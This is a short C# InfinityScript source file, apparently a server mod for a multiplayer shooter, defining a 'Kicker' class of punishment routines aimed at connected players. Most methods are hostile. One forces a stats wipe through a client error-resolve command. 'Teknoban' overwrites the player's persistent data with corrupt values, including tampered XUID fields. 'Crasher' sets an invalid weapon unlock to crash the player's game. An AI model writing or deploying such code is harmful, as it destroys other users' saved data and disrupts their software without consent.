using InfinityScript;

namespace ExtensionScript
{
    class Kicker
    {
        public Kicker()
        {

        }

        public void Reset(Entity player)
        {
            player.SetClientDvar("com_errorMessage", "Your stats have been reset as a result of bad conduct.");
            player.SetClientDvar("com_errorResolveCommand", "defaultStatsInit");
            Utilities.ExecuteCommand($"dropclient {player.EntRef} ^1Your stats have been reset as a result of bad conduct.");
        }

        public void Close(Entity player)
        {
            player.SetClientDvar("com_errorMessage", "You are being redirected to Steam as a result of bad conduct.");
            player.SetClientDvar("com_errorResolveCommand", "startSingleplayer");
        }

        public void Silentkick(Entity player)
        {
            Utilities.ExecuteCommand($"dropclient {player.EntRef} \"\"");
        }

        public void Teknoban(Entity player)
        {
            string banner = "^ÿÿÿÿ";

            for (int i = 0; i < 15; i++)
            {
                player.SetPlayerData("customClasses", i, "name", banner);
                player.SetPlayerData("customClasses", i, "inUse", true);
            }

            player.SetPlayerData("experience", int.MaxValue);
            player.SetPlayerData("prestige", 69);
            player.SetPlayerData("level", int.MinValue);
            player.SetPlayerData("kills", -1);
            player.SetPlayerData("playerXuidLow", int.MinValue);
            player.SetPlayerData("playerXuidHigh", int.MaxValue);
        }

        public void Crasher(Entity player)
        {
            player.SetPlayerData("persistentWeaponsUnlocked", "iw5_m60jugg", 1);
            Utilities.ExecuteCommand($"dropclient {player.EntRef} \"\"");
        }
    }
}
